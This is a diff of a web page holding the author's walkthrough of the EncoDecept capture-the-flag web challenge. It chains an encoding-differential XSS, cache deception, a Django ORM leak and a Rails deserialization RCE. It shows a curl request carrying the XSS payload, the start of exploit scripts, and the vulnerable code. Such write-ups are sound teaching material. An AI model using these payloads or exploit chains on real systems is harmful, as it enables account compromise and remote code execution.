@@ -90,7 +90,7 @@
   <rect x="-40" y="-40" width="740" height="340" fill="url(#woodcut-encodecept-wcECd)" clip-path="url(#woodcut-encodecept-wcECc9)"/>
 </svg>
 </div> </section> <div class="reading"> <nav class="toc" aria-label="Sections"> <p class="toc__cap">Contents</p> <ol> <li><a href="#encodecept-web" data-sec="encodecept-web"> <i>01</i><span>EncoDecept (WEB)</span> </a></li><li><a href="#understanding-functionality" data-sec="understanding-functionality"> <i>02</i><span>Understanding functionality</span> </a></li><li><a href="#cache-deception" data-sec="cache-deception"> <i>03</i><span>Cache Deception</span> </a></li><li><a href="#self-xss" data-sec="self-xss"> <i>04</i><span>Self XSS</span> </a></li><li><a href="#orm-leak" data-sec="orm-leak"> <i>05</i><span>ORM Leak</span> </a></li> </ol> </nav> <details class="toc-m"> <summary>Contents &middot; 5 sections</summary> <ol> <li><a href="#encodecept-web"> <i>01</i><span>EncoDecept (WEB)</span> </a></li><li><a href="#understanding-functionality"> <i>02</i><span>Understanding functionality</span> </a></li><li><a href="#cache-deception"> <i>03</i><span>Cache Deception</span> </a></li><li><a href="#self-xss"> <i>04</i><span>Self XSS</span> </a></li><li><a href="#orm-leak"> <i>05</i><span>ORM Leak</span> </a></li> </ol> </details> <article class="doc"><h2 id="encodecept-web">EncoDecept (WEB)</h2>
-<p>This is the intended solution for EncoDecept challenge that I created for Hack the Box University CTF 2024. Let’s start solving it.</p>
+<p>This is the intended solution for EncoDecept, a challenge I created for Hack the Box University CTF 2024.</p>
 <h2 id="understanding-functionality">Understanding functionality</h2>
 <p>Visiting the home page displays an auth page we can register and login:</p>
 <p><img src="/images/encodecept/login.webp" alt="Login Page"></p>
@@ -143,11 +143,11 @@
 <span class="line"><span style="color:#7EE787">Date</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> Fri, 15 Nov 2024 23:22:46 GMT</span></span>
 <span class="line"><span style="color:#7EE787">Content-Type</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> text/html</span></span>
 <span class="line"><span style="color:#E6EDF3">...SNIP...</span></span></code></pre>
-<p>The <code>Content-Type</code> header does not specify a charset, and the charset is not defined with a meta tag either. This makes it vulnerable to encoding differential attacks, as explained in <a href="https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/">this research</a>. It turns out we can break out of the HTML context by switching to the JIS X 0208 1978 charset. Let’s test that out. Sending the following request to update the <code>bio</code> is recommended to use a proxy:</p>
+<p>The <code>Content-Type</code> header does not specify a charset, and the charset is not defined with a meta tag either. This makes the page vulnerable to encoding differential attacks, as explained in <a href="https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/">this research</a>. Switching to the JIS X 0208 1978 charset lets us break out of the HTML context. I used a proxy to send the following request and update the <code>bio</code>:</p>
 <pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">curl</span><span style="color:#A5D6FF"> 'http://127.0.0.1:1337/settings'</span><span style="color:#79C0FF"> -X</span><span style="color:#A5D6FF"> POST</span><span style="color:#A5D6FF"> ...SNIP...</span><span style="color:#79C0FF"> --data-raw</span><span style="color:#A5D6FF"> '_method=patch&#x26;authenticity_token=loph8GcIcxns14fBxvHfIT69DosomkrGvXrdX_jcbPzuYgEeGB-UergMjfFG9crk3HGhHUjZ6sgBD_GKvLlgAw&#x26;username=test&#x26;bio=![%1b$@](test.png)+superman+![batman](shaktiman.png)&#x26;commit=Update+Settings'</span></span></code></pre>
 <p>We pass the following as the bio: <code>![%1b$@](test.png)+superman+![batman](shaktiman.png)</code>. If this works, we should see a bunch of random characters.</p>
 <p><img src="/images/encodecept/ran.webp" alt="Random Characters Output"></p>
-<p>It worked; however, it only works on Chrome. Moving on, let’s try to execute XSS using the following payload: <code>![%1b$@](test.png)+%1B(B+![batman](onerror=alert(1)//)</code></p>
+<p>The encoding differential worked in Chrome. I then used the following payload to execute JavaScript: <code>![%1b$@](test.png)+%1B(B+![batman](onerror=alert(1)//)</code></p>
 <p><img src="/images/encodecept/al.webp" alt="XSS Alert Box"></p>
 <p>An alert box appears, confirming the XSS vulnerability. Next, we move on to the report functionality. The report feature takes a URL and simply visits it:</p>
 <pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#FF7B72">def</span><span style="color:#D2A8FF"> startChromiumBot</span><span style="color:#E6EDF3">(url):</span></span>
@@ -174,7 +174,7 @@
 <span class="line"><span style="color:#E6EDF3">        driver.get(url)</span></span>
 <span class="line"><span style="color:#FF7B72">    finally</span><span style="color:#E6EDF3">:</span></span>
 <span class="line"><span style="color:#E6EDF3">        driver.quit()</span></span></code></pre>
-<p>Let’s create an exploit script to automate this process as much as possible:</p>
+<p>I automated the registration, profile update, cache deception, and report steps with this script:</p>
 <pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#FF7B72">import</span><span style="color:#E6EDF3"> requests</span></span>
 <span class="line"><span style="color:#FF7B72">from</span><span style="color:#E6EDF3"> bs4 </span><span style="color:#FF7B72">import</span><span style="color:#E6EDF3"> BeautifulSoup</span></span>
 <span class="line"><span style="color:#FF7B72">import</span><span style="color:#E6EDF3"> random</span></span>
@@ -254,7 +254,7 @@
 <p>This script registers a new user, logs in, updates the bio with an XSS payload, performs cache deception, and reports it. On our webhook, we receive a request:</p>
 <p><img src="/images/encodecept/hk.webp" alt="Webhook Request"></p>
 <h2 id="orm-leak">ORM Leak</h2>
-<p>Now that we have XSS on <code>contract_manager</code>, let’s explore what we can do. We can’t steal the cookie as it’s HTTPOnly, but let’s investigate the functionality accessible by <code>contract_manager</code>. We can observe the following code in the Django API:</p>
+<p>The XSS runs as <code>contract_manager</code>, but its cookie is <code>HttpOnly</code>. The useful attack surface is therefore the functionality available to that account. The Django API includes this endpoint:</p>
 <pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#FF7B72">class</span><span style="color:#FFA657"> FilteredContractsView</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">APIView</span><span style="color:#E6EDF3">):</span></span>
 <span class="line"><span style="color:#E6EDF3">    permission_classes </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [IsAuthenticated, IsContractManagerOrAdmin]</span></span>
 <span class="line"></span>
@@ -272,7 +272,7 @@
 <p>This specific line of code makes it <a href="https://www.elttam.com/blog/plormbing-your-django-orm/">vulnerable to an ORM leak</a>:</p>
 <pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#E6EDF3">filtered_data </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> {key: value </span><span style="color:#FF7B72">for</span><span style="color:#E6EDF3"> key, value </span><span style="color:#FF7B72">in</span><span style="color:#E6EDF3"> request.data.items() </span><span style="color:#FF7B72">if</span><span style="color:#E6EDF3"> key </span><span style="color:#FF7B72">!=</span><span style="color:#A5D6FF"> "all"</span><span style="color:#E6EDF3">}</span></span>
 <span class="line"><span style="color:#E6EDF3">contracts </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> Contract.objects.filter(</span><span style="color:#FF7B72">**</span><span style="color:#E6EDF3">filtered_data)</span></span></code></pre>
-<p>Let’s log in as <code>contract_manager</code> on our local instance and observe how the frontend interacts with the backend.</p>
+<p>Logging in as <code>contract_manager</code> on a local instance shows how the frontend calls the endpoint.</p>
 <p><img src="/images/encodecept/fil.webp" alt="Filtered Contracts"></p>
 <p>It simply passes the parameters as URL parameters. The contract model has a foreign key:</p>
 <pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#FF7B72">class</span><span style="color:#FFA657"> Contract</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">models</span><span style="color:#E6EDF3">.</span><span style="color:#79C0FF">Model</span><span style="color:#E6EDF3">):</span></span>
@@ -357,7 +357,7 @@
 <span class="line"><span style="color:#79C0FF">        data:</span><span style="color:#E6EDF3"> serialized_content,</span></span>
 <span class="line"><span style="color:#79C0FF">        user_id:</span><span style="color:#E6EDF3"> user_data[</span><span style="color:#A5D6FF">'id'</span><span style="color:#E6EDF3">]</span></span>
 <span class="line"><span style="color:#E6EDF3">    }.</span><span style="color:#D2A8FF">merge</span><span style="color:#E6EDF3">(params.</span><span style="color:#D2A8FF">to_unsafe_h</span><span style="color:#E6EDF3">))</span></span></code></pre>
-<p>The merge operation makes it vulnerable. If we provide a <code>data</code> parameter, it will not overwrite it with the serialized content. Therefore, we can insert our malicious serialized content, which will be deserialized later, leading to Remote Code Execution (RCE). There is a recent <a href="https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/blob/main/marshal/3.4-rc/marshal-rce-ruby-3.4-rc.rb">Rails Universal RCE gadget chain</a> that we can utilize. Let’s add this to our exploit script.</p>
+<p>The merge order makes this vulnerable. If we provide a <code>data</code> parameter, it overrides the serialized content generated by the controller. We can therefore supply malicious serialized data that is deserialized later, leading to Remote Code Execution (RCE). I used this recent <a href="https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/blob/main/marshal/3.4-rc/marshal-rce-ruby-3.4-rc.rb">Rails Universal RCE gadget chain</a> in the exploit script.</p>
 <pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#FF7B72">import</span><span style="color:#E6EDF3"> requests</span></span>
 <span class="line"><span style="color:#FF7B72">from</span><span style="color:#E6EDF3"> bs4 </span><span style="color:#FF7B72">import</span><span style="color:#E6EDF3"> BeautifulSoup</span></span>
 <span class="line"></span>
